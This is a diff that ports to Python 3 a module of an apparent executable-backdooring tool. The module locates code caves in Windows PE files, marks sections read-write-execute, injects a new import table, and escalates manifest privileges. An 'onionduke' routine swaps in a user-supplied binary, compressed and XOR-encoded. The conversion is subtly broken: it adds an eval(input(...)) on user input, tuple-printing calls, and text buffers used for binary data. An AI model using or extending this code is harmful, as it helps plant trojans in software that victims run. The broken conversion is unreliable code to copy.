@@ -40,7 +40,7 @@ import time
 import subprocess
 import pefile
 import operator
-import cStringIO
+import io
 import random
 import string
 import re
@@ -142,26 +142,26 @@ class pebin():
         if self.FIND_CAVES is True:
             issupported = self.support_check()
             if issupported is False:
-                print self.FILE, "is not supported."
+                print((self.FILE, "is not supported."))
                 return False
-            print ("Looking for caves with a size of %s bytes (measured as an integer" % self.SHELL_LEN)
+            print(("Looking for caves with a size of %s bytes (measured as an integer" % self.SHELL_LEN))
             self.find_all_caves()
             return True
 
         if self.SUPPORT_CHECK is True:
             if not self.FILE:
-                print "You must provide a file to see if it is supported (-f)"
+                print("You must provide a file to see if it is supported (-f)")
                 return False
             try:
                 is_supported = self.support_check()
-            except Exception, e:
+            except Exception as e:
                 is_supported = False
-                print 'Exception:', str(e), '%s' % self.FILE
+                print(('Exception:', str(e), '%s' % self.FILE))
             if is_supported is False:
-                print "%s is not supported." % self.FILE
+                print(("%s is not supported." % self.FILE))
                 return False
             else:
-                print "%s is supported." % self.FILE
+                print(("%s is supported." % self.FILE))
                 return True
 
         self.output_options()
@@ -175,7 +175,7 @@ class pebin():
         """
 
         self.binary.seek(int('3C', 16))
-        print "[*] Gathering file info"
+        print("[*] Gathering file info")
         self.flItms['filename'] = self.FILE
         self.flItms['buffer'] = 0
         self.flItms['JMPtoCodeAddress'] = 0
@@ -187,9 +187,9 @@ class pebin():
         self.binary.seek(self.flItms['COFF_Start'])
         self.flItms['MachineType'] = struct.unpack('<H', self.binary.read(2))[0]
         if self.VERBOSE is True:
-            for mactype, name in MachineTypes.iteritems():
+            for mactype, name in list(MachineTypes.items()):
                 if int(mactype, 16) == self.flItms['MachineType']:
-                        print 'MachineType is:', name
+                        print(('MachineType is:', name))
         self.binary.seek(self.flItms['COFF_Start'] + 2, 0)
         self.flItms['NumberOfSections'] = struct.unpack('<H', self.binary.read(2))[0]
         self.flItms['TimeDateStamp'] = struct.unpack('<I', self.binary.read(4))[0]
@@ -283,7 +283,7 @@ class pebin():
         self.flItms['BeginSections'] = self.binary.tell()
 
         # This could be fixed in the great refactor.
-        if self.flItms['NumberOfSections'] is not 0 and 'Section' not in self.flItms:
+        if self.flItms['NumberOfSections'] != 0 and 'Section' not in self.flItms:
             self.flItms['Sections'] = []
             for section in range(self.flItms['NumberOfSections']):
                 sectionValues = []
@@ -308,7 +308,7 @@ class pebin():
                 sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                 self.flItms['Sections'].append(sectionValues)
                 if 'UPX1'.lower() in sectionValues[0].lower():
-                    print "[*] UPX packed, continuing..."
+                    print("[*] UPX packed, continuing...")
 
                 if ('.text\x00\x00\x00' == sectionValues[0] or
                     'AUTO\x00\x00\x00\x00' == sectionValues[0] or
@@ -338,8 +338,8 @@ class pebin():
             #  That could be spoofed and it returns to another RE section.
             if self.PATCH_METHOD != 'onionduke':
                 if "textSectionName" not in self.flItms:
-                    print "[!] Text section does not have a normal name, not guessing, exiting"
-                    print "[!]\tFirst section, text section potential name:", str(self.flItms['Sections'][0][0])
+                    print("[!] Text section does not have a normal name, not guessing, exiting")
+                    print(("[!]\tFirst section, text section potential name:", str(self.flItms['Sections'][0][0])))
                     return False
             else:
                 self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
@@ -461,9 +461,9 @@ class pebin():
                 continue
             
             if len(afile.split(".")) > 2:
-                print "!" * 50
-                print "\t[!] Make sure there are no '.' in your preprocessor filename:", afile
-                print "!" * 50
+                print(("!" * 50))
+                print(("\t[!] Make sure there are no '.' in your preprocessor filename:", afile))
+                print(("!" * 50))
                 
                 return False
             
@@ -472,12 +472,12 @@ class pebin():
             preprocessor_name = __import__( name, fromlist=[''])
             
             if preprocessor_name.enabled is True:
-                print "[*] Executing preprocessor:", afile.strip(".py")
+                print(("[*] Executing preprocessor:", afile.strip(".py")))
             else:
                 continue
             
             if preprocessor_name.file_format.lower() in ['pe', 'all']: #'elf', 'macho', 'mach-o']:
-                print '[*] Running preprocessor', afile.strip(".py"), "against", preprocessor_name.file_format, "formats"
+                print(('[*] Running preprocessor', afile.strip(".py"), "against", preprocessor_name.file_format, "formats"))
             else:
                 continue
             
@@ -492,24 +492,24 @@ class pebin():
                 self.tmp_file = tempfile.NamedTemporaryFile()
                 self.tmp_file.write(open(self.FILE, 'rb').read())
                 self.tmp_file.seek(0)
-                print "[*] Creating temp file:", self.tmp_file.name
+                print(("[*] Creating temp file:", self.tmp_file.name))
             else:
-                print "[*] Using existing tempfile from prior preprocessor"
+                print("[*] Using existing tempfile from prior preprocessor")
             
             load_name = name +  ".preprocessor"
             preproc = self.loadthis(load_name)
             
             m = preproc(self)
             
-            print "=" * 50
+            print(("=" * 50))
             
             # execute preprocessor
             result = m.run()
             
             if result is False:
-                print "[!] Preprocessor Failure :("
+                print("[!] Preprocessor Failure :(")
 
-            print "=" * 50
+            print(("=" * 50))
             
             # After running push it to BDF.
             
@@ -519,7 +519,7 @@ class pebin():
             if preprocessor_name.recheck_support is True:
                 issupported = self.support_check()
                 if issupported is False:
-                    print self.FILE, "is not supported."
+                    print((self.FILE, "is not supported."))
                     return False                
 
     def check_apis(self, aFile):
@@ -528,9 +528,9 @@ class pebin():
 
         #make this option only if a IAT based shellcode is selected
         if 'apis_needed' in self.flItms:
-            print "[*] Loading PE in pefile"
+            print("[*] Loading PE in pefile")
             pe = pefile.PE(aFile, fast_load=True)
-            print "[*] Parsing data directories"
+            print("[*] Parsing data directories")
             pe.parse_data_directories()
             self.flItms['neededAPIs'] = set()
             try:
@@ -548,42 +548,42 @@ class pebin():
                         self.flItms['neededAPIs'].add(api)
 
             except Exception as e:
-                print "Exception:", str(e)
+                print(("Exception:", str(e)))
             self.flItms['ImportTableFileOffset'] = pe.get_physical_by_rva(self.flItms['ImportTableRVA'])
 
         #####################################
 
     def print_flItms(self, flItms):
 
-        keys = self.flItms.keys()
+        keys = list(self.flItms.keys())
         keys.sort()
-        print "*" * 25, "BEGIN flItms", "*" * 25
+        print(("*" * 25, "BEGIN flItms", "*" * 25))
         for item in keys:
             if type(self.flItms[item]) == int:
-                print item + ':', hex(self.flItms[item])
+                print((item + ':', hex(self.flItms[item])))
             elif item == 'Sections':
-                print "-" * 50
+                print(("-" * 50))
                 for section in self.flItms['Sections']:
-                    print "Section Name", section[0]
-                    print "Virtual Size", hex(section[1])
-                    print "Virtual Address", hex(section[2])
-                    print "SizeOfRawData", hex(section[3])
-                    print "PointerToRawData", hex(section[4])
-                    print "PointerToRelocations", hex(section[5])
-                    print "PointerToLinenumbers", hex(section[6])
-                    print "NumberOfRelocations", hex(section[7])
-                    print "NumberOfLinenumbers", hex(section[8])
-                    print "SectionFlags", hex(section[9])
-                    print "-" * 50
+                    print(("Section Name", section[0]))
+                    print(("Virtual Size", hex(section[1])))
+                    print(("Virtual Address", hex(section[2])))
+                    print(("SizeOfRawData", hex(section[3])))
+                    print(("PointerToRawData", hex(section[4])))
+                    print(("PointerToRelocations", hex(section[5])))
+                    print(("PointerToLinenumbers", hex(section[6])))
+                    print(("NumberOfRelocations", hex(section[7])))
+                    print(("NumberOfLinenumbers", hex(section[8])))
+                    print(("SectionFlags", hex(section[9])))
+                    print(("-" * 50))
             else:
-                print item + ':', self.flItms[item]
-        print "*" * 25, "END flItms", "*" * 25
+                print((item + ':', self.flItms[item]))
+        print(("*" * 25, "END flItms", "*" * 25))
 
     def change_section_flags(self, section):
         """
         Changes the user selected section to RWE for successful execution
         """
-        print "[*] Changing flags for section:", section
+        print(("[*] Changing flags for section:", section))
         self.flItms['newSectionFlags'] = int('e00000e0', 16)
         self.binary.seek(self.flItms['BeginSections'], 0)
         for _ in range(self.flItms['NumberOfSections']):
@@ -615,9 +615,9 @@ class pebin():
         #[0x0000][DLL1 API2 NAME][0x00]
 
         for api in self.flItms['neededAPIs']:
-            print "[!] Adding %s Thunk in new IAT" % api
+            print(("[!] Adding %s Thunk in new IAT" % api))
             #find DLL
-            for aDLL, exports in winapi.winapi.iteritems():
+            for aDLL, exports in list(winapi.winapi.items()):
                 if aDLL not in self.flItms['iatdict'] and api in exports:
                     self.flItms['lenDLLSection'] += len(aDLL) + 1
                     self.flItms['iatdict'][aDLL] = {api: 0}
@@ -642,7 +642,7 @@ class pebin():
         firstStructure = ''
         dllLen = 0
         sectionCount = 0
-        for aDLL, api in self.flItms['iatdict'].iteritems():
+        for aDLL, api in list(self.flItms['iatdict'].items()):
             firstStructure += struct.pack("<I", (self.flItms['dllCount'] * 20 + self.flItms['lenDLLSection'] +
                                                  (self.flItms['thunkSectionSize'] / 2) +
                                                  self.flItms['BeginningOfNewImports'] + 20 + sectionCount))
@@ -675,9 +675,9 @@ class pebin():
 
         apiOffset = (self.flItms['lenDLLSection'] + self.flItms['thunkSectionSize'] +
                      self.flItms['BeginningOfNewImports'] + len(self.flItms['iatTransition']))
-        for aDLL, api in self.flItms['iatdict'].iteritems():
+        for aDLL, api in list(self.flItms['iatdict'].items()):
             newDLLSection += aDLL + struct.pack("!B", 0x0)
-            for apiName, address in api.iteritems():
+            for apiName, address in list(api.items()):
                 newapiNameSection += struct.pack("<H", 0x0) + apiName + struct.pack("<B", 0x0)
                 api[apiName] = apiOffset
                 if self.flItms['Magic'] == 0x20B:
@@ -697,7 +697,7 @@ class pebin():
     def patch_in_new_iat(self):
 
         with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
-            print "[*] Patching Import Directory Table into a code cave"
+            print("[*] Patching Import Directory Table into a code cave")
 
             self.populate_iat_values()
 
@@ -719,14 +719,14 @@ class pebin():
             newthunkSection = 0
             firstStructure = 0
 
-            for aDLL, api in self.flItms['iatdict'].iteritems():
+            for aDLL, api in list(self.flItms['iatdict'].items()):
                 firstStructure += 4 + 8 + 4 + 4
 
             firstStructure += 8 + 8 + 4
 
-            for aDLL, api in self.flItms['iatdict'].iteritems():
+            for aDLL, api in list(self.flItms['iatdict'].items()):
                 newDLLSection += len(aDLL) + 1
-                for apiName, address in api.iteritems():
+                for apiName, address in list(api.items()):
                     newapiNameSection += 2 + len(apiName) + 1
                     if self.flItms['Magic'] == 0x20B:
                         newthunkSection += 8
@@ -787,7 +787,7 @@ class pebin():
         """
         Creates new import table for missing imports in a new section
         """
-        print "[*] Adding New Section for updated Import Table"
+        print("[*] Adding New Section for updated Import Table")
 
         with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
             self.populate_iat_values()
@@ -803,7 +803,7 @@ class pebin():
             #get file size
             filesize = os.stat(self.flItms['backdoorfile']).st_size
             if filesize > self.flItms['SizeOfImage']:
-                print "[!] File has extra data after last section, cannot add new section"
+                print("[!] File has extra data after last section, cannot add new section")
                 return False
             self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
             self.binary.write(struct.pack('<H', self.flItms['NumberOfSections'] + 1))
@@ -823,7 +823,7 @@ class pebin():
             self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
             self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
             if self.VERBOSE is True:
-                print 'New Section PointerToRawData:', self.flItms['newSectionPointerToRawData']
+                print(('New Section PointerToRawData:', self.flItms['newSectionPointerToRawData']))
             self.binary.write(struct.pack('<I', 0))
             self.binary.write(struct.pack('<I', 0))
             self.binary.write(struct.pack('<I', 0))
@@ -873,7 +873,7 @@ class pebin():
         takes in the dict from gather_file_info_win function and
         writes to the file and returns flItms
         """
-        print "[*] Creating Code Cave"
+        print("[*] Creating Code Cave")
         self.flItms['NewSectionSize'] = len(self.flItms['shellcode']) + 250  # bytes
         self.flItms['SectionName'] = self.NSECTION  # less than 7 chars
         self.flItms['filesize'] = os.stat(self.flItms['filename']).st_size
@@ -900,8 +900,8 @@ class pebin():
         self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
         self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
         if self.VERBOSE is True:
-            print 'New Section PointerToRawData'
-            print self.flItms['newSectionPointerToRawData']
+            print('New Section PointerToRawData')
+            print((self.flItms['newSectionPointerToRawData']))
         self.binary.write(struct.pack('<I', 0))
         self.binary.write(struct.pack('<I', 0))
         self.binary.write(struct.pack('<I', 0))
@@ -927,7 +927,7 @@ class pebin():
         Prints results to screen
         """
 
-        print "[*] Looking for caves"
+        print("[*] Looking for caves")
         SIZE_CAVE_TO_FIND = self.SHELL_LEN
         BeginCave = 0
         Tracking = 0
@@ -961,26 +961,26 @@ class pebin():
                 sectionFound = False
                 if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \
                         caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
-                    print "We have a winner:", section[0]
-                    print '->Begin Cave', hex(caves[0])
-                    print '->End of Cave', hex(caves[1])
-                    print 'Size of Cave (int)', caves[1] - caves[0]
-                    print 'SizeOfRawData', hex(section[3])
-                    print 'PointerToRawData', hex(section[4])
-                    print 'End of Raw Data:', hex(section[3] + section[4])
-                    print '*' * 50
+                    print(("We have a winner:", section[0]))
+                    print(('->Begin Cave', hex(caves[0])))
+                    print(('->End of Cave', hex(caves[1])))
+                    print(('Size of Cave (int)', caves[1] - caves[0]))
+                    print(('SizeOfRawData', hex(section[3])))
+                    print(('PointerToRawData', hex(section[4])))
+                    print(('End of Raw Data:', hex(section[3] + section[4])))
+                    print(('*' * 50))
                     sectionFound = True
                     break
             if sectionFound is False:
                 try:
-                    print "No section"
-                    print '->Begin Cave', hex(caves[0])
-                    print '->End of Cave', hex(caves[1])
-                    print 'Size of Cave (int)', caves[1] - caves[0]
-                    print '*' * 50
+                    print("No section")
+                    print(('->Begin Cave', hex(caves[0])))
+                    print(('->End of Cave', hex(caves[1])))
+                    print(('Size of Cave (int)', caves[1] - caves[0]))
+                    print(('*' * 50))
                 except Exception as e:
-                    print str(e)
-        print "[*] Total of %s caves found" % len(caveTracker)
+                    print((str(e)))
+        print(("[*] Total of %s caves found" % len(caveTracker)))
         self.binary.close()
 
     def find_cave(self):
@@ -998,9 +998,9 @@ class pebin():
             SIZE_CAVE_TO_FIND = self.flItms['shellcode_length']
             self.flItms['len_allshells'] = (self.flItms['shellcode_length'], )
 
-        print "[*] Looking for caves that will fit the minimum "\
-              "shellcode length of %s" % SIZE_CAVE_TO_FIND
-        print "[*] All caves lengths: ", ', '.join([str(i) for i in self.flItms['len_allshells']])
+        print(("[*] Looking for caves that will fit the minimum "\
+              "shellcode length of %s" % SIZE_CAVE_TO_FIND))
+        print(("[*] All caves lengths: ", ', '.join([str(i) for i in self.flItms['len_allshells']])))
         Tracking = 0
         count = 1
         #BeginCave=0
@@ -1055,14 +1055,14 @@ class pebin():
                        caves[1] <= (section[3] + section[4]) and \
                        caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                         if self.VERBOSE is True:
-                            print "Inserting code in this section:", section[0]
-                            print '->Begin Cave', hex(caves[0])
-                            print '->End of Cave', hex(caves[1])
-                            print 'Size of Cave (int)', caves[1] - caves[0]
-                            print 'SizeOfRawData', hex(section[3])
-                            print 'PointerToRawData', hex(section[4])
-                            print 'End of Raw Data:', hex(section[3] + section[4])
-                            print '*' * 50
+                            print(("Inserting code in this section:", section[0]))
+                            print(('->Begin Cave', hex(caves[0])))
+                            print(('->End of Cave', hex(caves[1])))
+                            print(('Size of Cave (int)', caves[1] - caves[0]))
+                            print(('SizeOfRawData', hex(section[3])))
+                            print(('PointerToRawData', hex(section[4])))
+                            print(('End of Raw Data:', hex(section[3] + section[4])))
+                            print(('*' * 50))
                         JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                             5 - self.flItms['PatchLocation'])
 
@@ -1073,15 +1073,15 @@ class pebin():
                                         section[1], section[2]]
                         break
                 except:
-                    print "-End of File Found.."
+                    print("-End of File Found..")
                     break
                 if sectionFound is False:
                     if self.VERBOSE is True:
-                        print "No section"
-                        print '->Begin Cave', hex(caves[0])
-                        print '->End of Cave', hex(caves[1])
-                        print 'Size of Cave (int)', caves[1] - caves[0]
-                        print '*' * 50
+                        print("No section")
+                        print(('->Begin Cave', hex(caves[0])))
+                        print(('->End of Cave', hex(caves[1])))
+                        print(('Size of Cave (int)', caves[1] - caves[0]))
+                        print(('*' * 50))
 
                 JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                     5 - self.flItms['PatchLocation'])
@@ -1090,15 +1090,15 @@ class pebin():
                                     caves[1] - caves[0], None,
                                     None, JMPtoCodeAddress]
                 except:
-                    print "EOF"
+                    print("EOF")
 
         CavesPicked = {}
 
         if self.PATCH_METHOD.lower() == 'automatic':
-            print "[*] Attempting PE File Automatic Patching"
+            print("[*] Attempting PE File Automatic Patching")
             availableCaves = {}
             # Take away the rsrc restriction, solved
-            for caveNumber, caveValues in pickACave.iteritems():
+            for caveNumber, caveValues in list(pickACave.items()):
                 # caveValues[0], Begin Cave, [1] End of Cave
                 # stay clear of iat_cave_loc, will be zero if never touched
                 if self.iat_cave_loc != 0:
@@ -1125,27 +1125,27 @@ class pebin():
                 trackSectionName = set()
 
                 # other caves first
-                for ref in sorted(payloadDict.items(), key=operator.itemgetter(1), reverse=True):
+                for ref in sorted(list(payloadDict.items()), key=operator.itemgetter(1), reverse=True):
                     # largest first
                     # now drop the caves that are big enough in a set
                     # and randomly select from it
                     _tempCaves = {}
                     if _tempCaves == {}:
                         # nothing? get out
-                        for refnum, caveSize in availableCaves.iteritems():
+                        for refnum, caveSize in list(availableCaves.items()):
                             if caveSize >= ref[1]:
                                 _tempCaves[refnum] = caveSize
                         if _tempCaves == {}:
                             break
-                    selection = choice(_tempCaves.keys())
-                    print '[!] Selected:', str(selection) + ":", ("Section Name: {0}; Cave begin: {1} End: {2}; "
+                    selection = choice(list(_tempCaves.keys()))
+                    print(('[!] Selected:', str(selection) + ":", ("Section Name: {0}; Cave begin: {1} End: {2}; "
                                                                   "Cave Size: {3}; Payload Size: {4}".format(pickACave[selection][0], pickACave[selection][1],
                                                                                           pickACave[selection][2], pickACave[selection][3], ref[1]
-                                                                                          ))
+                                                                                          ))))
                     trackSectionName.add(pickACave[selection][0])
                     #remove the selection from the dict
                     popSet = set()
-                    for cave_ref, cave_vals in availableCaves.iteritems():
+                    for cave_ref, cave_vals in list(availableCaves.items()):
                         if pickACave[cave_ref][1] <= pickACave[selection][1] <= pickACave[cave_ref][2] or \
                             pickACave[cave_ref][1] <= pickACave[selection][2] <= pickACave[cave_ref][2] or \
                             pickACave[selection][1] <= pickACave[cave_ref][1] <= pickACave[selection][2] or \
@@ -1153,13 +1153,13 @@ class pebin():
                             popSet.add(cave_ref)
                     for item in popSet:
                         availableCaves.pop(item)     
-                    if selection in availableCaves.keys():
+                    if selection in list(availableCaves.keys()):
                         availableCaves.pop(selection)
                     CavesPicked[ref[0]] = pickACave[selection]
                 break
 
             if len(CavesPicked) != len(self.flItms['len_allshells']):
-                print "[!] Did not find suitable caves - trying next method"
+                print("[!] Did not find suitable caves - trying next method")
                 if self.flItms['cave_jumping'] is True:
                     return 'single'
                 else:
@@ -1177,19 +1177,19 @@ class pebin():
                    "############################################################")
 
             for k, item in enumerate(self.flItms['len_allshells']):
-                print "[*] Cave {0} length as int: {1}".format(k + 1, item)
-                print "[*] Available caves: "
+                print(("[*] Cave {0} length as int: {1}".format(k + 1, item)))
+                print("[*] Available caves: ")
 
                 if pickACave == {}:
-                    print "[!!!!] No caves available! Use 'j' for cave jumping or"
-                    print "[!!!!] 'i' or 'q' for ignore."
-                for ref, details in pickACave.iteritems():
+                    print("[!!!!] No caves available! Use 'j' for cave jumping or")
+                    print("[!!!!] 'i' or 'q' for ignore.")
+                for ref, details in list(pickACave.items()):
                     if details[3] >= item:
-                        print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
+                        print((str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
                                                "End: {5}; Cave begin: {1} End: {2}; "
                                                "Cave Size: {3}".format(details[0], details[1], details[2],
                                                                        details[3], details[4], details[5],
-                                                                       details[6]))
+                                                                       details[6]))))
 
                 while True:
                     try:
@@ -1197,13 +1197,13 @@ class pebin():
                     except:
                         self.CAVE_MINER_TRACKER = 0
 
-                    print "*" * 50
+                    print(("*" * 50))
 
-                    selection = raw_input("[!] Enter your selection: ")
+                    selection = eval(input("[!] Enter your selection: "))
                     try:
                         selection = int(selection)
 
-                        print "[!] Using selection: %s" % selection
+                        print(("[!] Using selection: %s" % selection))
                         try:
                             if self.CHANGE_ACCESS is True:
                                 if pickACave[selection][0] is not None:
@@ -1211,10 +1211,10 @@ class pebin():
                             CavesPicked[k] = pickACave[selection]
                             break
                         except:
-                            print "[!!!!] User selection beyond the bounds of available caves."
-                            print "[!!!!] Try a number or the following commands:"
-                            print "[!!!!] append or a, jump or j, ignore or i, single or s"
-                            print "[!!!!] TRY AGAIN."
+                            print("[!!!!] User selection beyond the bounds of available caves.")
+                            print("[!!!!] Try a number or the following commands:")
+                            print("[!!!!] append or a, jump or j, ignore or i, single or s")
+                            print("[!!!!] TRY AGAIN.")
                             continue
                     except:
                         pass
@@ -1222,7 +1222,7 @@ class pebin():
                     if selection.lower() in breakOutValues:
                         return selection
         else:
-            print "[!] Invalid Patching Method"
+            print("[!] Invalid Patching Method")
             return None
         return CavesPicked
 
@@ -1234,7 +1234,7 @@ class pebin():
         """
         #g = open(flItms['filename'], "rb")
         result = False
-        print "[*] Checking Execution Level"
+        print("[*] Checking Execution Level")
         if 'rsrcPointerToRawData' in self.flItms:
             search_lngth = len('requestedExecutionLevel level="highestAvailable"')
             data_read = 0
@@ -1249,9 +1249,9 @@ class pebin():
                 data_read += 1
 
         if result is True:
-            print "[*] %s must run with highest available privileges" % self.FILE
+            print(("[*] %s must run with highest available privileges" % self.FILE))
         else:
-            print "[*] %s does not require highest available privileges" % self.FILE
+            print(("[*] %s does not require highest available privileges" % self.FILE))
 
         return result
 
@@ -1264,7 +1264,7 @@ class pebin():
         """
         #g = open(flItms['filename'], "rb")
         result = False
-        print "[*] Checking execution Level"
+        print("[*] Checking execution Level")
         if 'rsrcPointerToRawData' in self.flItms:
             search_lngth = len('requestedExecutionLevel')
             data_read = 0
@@ -1279,10 +1279,10 @@ class pebin():
                     search_lngth = len('level=')
                     if self.binary.read(search_lngth + 1) == ' level=':
                         if self.binary.read(len("\"highestAvailable\"")) == "\"highestAvailable\"":
-                            print "[*] File already set to highestAvailable execution level"
+                            print("[*] File already set to highestAvailable execution level")
                             break
                         else:
-                            print "[!] Patching 'highestAvailable' in PE Manifest"
+                            print("[!] Patching 'highestAvailable' in PE Manifest")
                             self.binary.seek(self.flItms['manifestLOC'] + data_read + len(temp_data) + search_lngth + 1, 0)
                             self.binary.write("\"highestAvailable\"")
                             result = True
@@ -1297,10 +1297,10 @@ class pebin():
                 if temp_data == 'level=' and found_exeLevel is True:
                     #this is what I call a spread out manifest
                     if self.binary.read(len("\"highestAvailable\"")) == "\"highestAvailable\"":
-                        print "[*] File already set to highestAvailable execution level"
+                        print("[*] File already set to highestAvailable execution level")
                         break
                     else:
-                        print "[!] Patching 'highestAvailable' in PE Manifest"
+                        print("[!] Patching 'highestAvailable' in PE Manifest")
                         self.binary.seek(self.flItms['manifestLOC'] + data_read + len(temp_data), 0)
                         self.binary.write("\"highestAvailable\"")
                         result = True
@@ -1362,7 +1362,7 @@ class pebin():
         self.rsrc_structure['Typeheader']['Entries'] = merge_two_dicts(self.rsrc_structure['Typeheader']["IDentries"],
                                                                        self.rsrc_structure['Typeheader']['NameEntries'])
 
-        for entry, value in self.rsrc_structure['Typeheader']["Entries"].iteritems():
+        for entry, value in list(self.rsrc_structure['Typeheader']["Entries"].items()):
             if entry == 24:  # 24 is the Manifest resource
                 self.binary.seek(self.flItms['rsrcPointerToRawData'] + (value & 0xffffff), 0)
 
@@ -1380,7 +1380,7 @@ class pebin():
                                                                         self.rsrc_structure[entry]["Names"])
 
                 #Now get language
-                for name_id, offset in self.rsrc_structure[entry]["NameIDs"].iteritems():
+                for name_id, offset in list(self.rsrc_structure[entry]["NameIDs"].items()):
                     self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offset & 0xffffff), 0)
                     self.rsrc_structure[name_id] = parse_header()
                     self.rsrc_structure[name_id]["IDs"] = {}
@@ -1396,7 +1396,7 @@ class pebin():
                                                                                self.rsrc_structure[name_id]["Names"])
 
                     #now get Data Entry Details and write
-                    for lanID, offsetDataEntry in self.rsrc_structure[name_id]["language"].iteritems():
+                    for lanID, offsetDataEntry in list(self.rsrc_structure[name_id]["language"].items()):
                         self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offsetDataEntry & 0xffffff), 0)
                         self.rsrc_structure[lanID] = parse_data_entry()
                     #Jump to Manifest
@@ -1413,30 +1413,30 @@ class pebin():
         supported by this program. Returns false if not supported,
         returns flItms if it is.
         """
-        print "[*] Checking if binary is supported"
+        print("[*] Checking if binary is supported")
         self.flItms['supported'] = False
         #convert to with open FIX
         with open(self.FILE, "r+b") as self.binary:
             if self.binary.read(2) != "\x4d\x5a":
-                print "%s not a PE File" % self.FILE
+                print(("%s not a PE File" % self.FILE))
                 return False
             if self.gather_file_info_win() is False and self.PATCH_METHOD != "onionduke":
-                print "[!] Failure during gathering file info."
+                print("[!] Failure during gathering file info.")
                 return False
             if self.flItms is False:
                 return False
             if MachineTypes[hex(self.flItms['MachineType'])] not in supported_types:
                 for item in self.flItms:
-                    print item + ':', self.flItms[item]
-                print ("This program does not support this format: %s"
-                       % MachineTypes[hex(self.flItms['MachineType'])])
+                    print((item + ':', self.flItms[item]))
+                print(("This program does not support this format: %s"
+                       % MachineTypes[hex(self.flItms['MachineType'])]))
             else:
                 self.flItms['supported'] = True
             targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
 
             if (self.flItms['Characteristics'] % 0x4000) - 0x2000 > 0 and self.flItms['DllCharacteristics'] > 0 \
                and self.PATCH_DLL is False:
-                print "[!] DLL patching not enabled"
+                print("[!] DLL patching not enabled")
                 return False
 
             if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
@@ -1449,7 +1449,7 @@ class pebin():
                 self.flItms['supported'] = False
 
             if self.flItms['BoundImportSize'] != 0:
-                print "[!] No support for Bound Imports at this time"
+                print("[!] No support for Bound Imports at this time")
                 return False
 
             if self.RUNAS_ADMIN is True and self.SUPPORT_CHECK is True:
@@ -1457,7 +1457,7 @@ class pebin():
                 if 'manifestLOC' in self.flItms:
                     self.flItms['runas_admin'] = self.runas_admin()
                 else:
-                    print '[!] No manifest in rsrc'
+                    print('[!] No manifest in rsrc')
 
             if self.VERBOSE is True:
                 self.print_flItms(self.flItms)
@@ -1468,17 +1468,17 @@ class pebin():
     def onionduke(self):
 
         if not any(chiptype not in "armv" for chiptype in subprocess.check_output(["uname", "-a"]).lower()):
-            print "[!] Only x86 and x86_64 chipset is supported for OnionDuke due to aPLib support"
+            print("[!] Only x86 and x86_64 chipset is supported for OnionDuke due to aPLib support")
             return False
         if 'rsrcSectionName' not in self.flItms:
-            print "[!] Missing rsrc section, not patching bianry"
+            print("[!] Missing rsrc section, not patching bianry")
             return False
 
         if not self.SUPPLIED_BINARY:
-            print "[!] No malware provided"
+            print("[!] No malware provided")
             return False
 
-        od_stub = cStringIO.StringIO()
+        od_stub = io.StringIO()
 
         stubPath = os.path.dirname(os.path.abspath(onionduke.__file__))
 
@@ -1486,8 +1486,8 @@ class pebin():
             #check if OnionDuke Stub
             self.binary.seek(0x5C0, 0)
             if self.binary.read(11) == "\x57\xE8\xE4\x10\x00\x00\x8B\x15\x2C\x20\x41":
-                print "[!!!!] Attempting to Patch an OnionDuke wrapped binary"
-                print "[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"
+                print("[!!!!] Attempting to Patch an OnionDuke wrapped binary")
+                print(("[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"))
                 compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
                 subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])
                 # key 0x1FE37D3E
@@ -1498,26 +1498,26 @@ class pebin():
                 xor_key2 = struct.unpack("<I", self.binary.read(4))[0]
                 if xor_key2 == xor_key1:
                     xorkey = xor_key1
-                    print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
+                    print(("[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)))
                     with open(compressedbin, 'r') as compressedBinary:
-                        xorBinary = cStringIO.StringIO()
+                        xorBinary = io.StringIO()
                         xor_file(compressedBinary, xorBinary, xorkey)
                     os.remove(compressedbin)
                 else:
-                    print "[*] Malformed OnionDuke Sample"
+                    print("[*] Malformed OnionDuke Sample")
                     return False
                 xorBinary.seek(0)
                 #get size and location of OD malware
                 self.binary.seek(0xfd3c, 0)
                 self.od_begin_malware = struct.unpack("<I", self.binary.read(4))[0]
                 self.binary.seek(0)
-                print "[!] Removing original malware from binary."
+                print("[!] Removing original malware from binary.")
                 new_stub = self.binary.read(self.od_begin_malware)
                 new_stub += xorBinary.read()
                 od_stub.write(new_stub)
                 self.od_end_malware = od_stub.tell()
                 self.od_size_malware = xorBinary.tell()
-                print "[*] Appending compressed user supplied binary after target binary"
+                print("[*] Appending compressed user supplied binary after target binary")
                 od_stub.seek(0xfd40, 0)
                 od_stub.write(struct.pack("<I", self.od_size_malware))
 
@@ -1525,45 +1525,45 @@ class pebin():
                 od_stub.write(open(stubPath + "/OD_stub.exe", 'r').read())
                 #copy rsrc to memory
                 self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
-                self.rsrc_section = cStringIO.StringIO()
-                print "[*] Copying rsrc section"
+                self.rsrc_section = io.StringIO()
+                print("[*] Copying rsrc section")
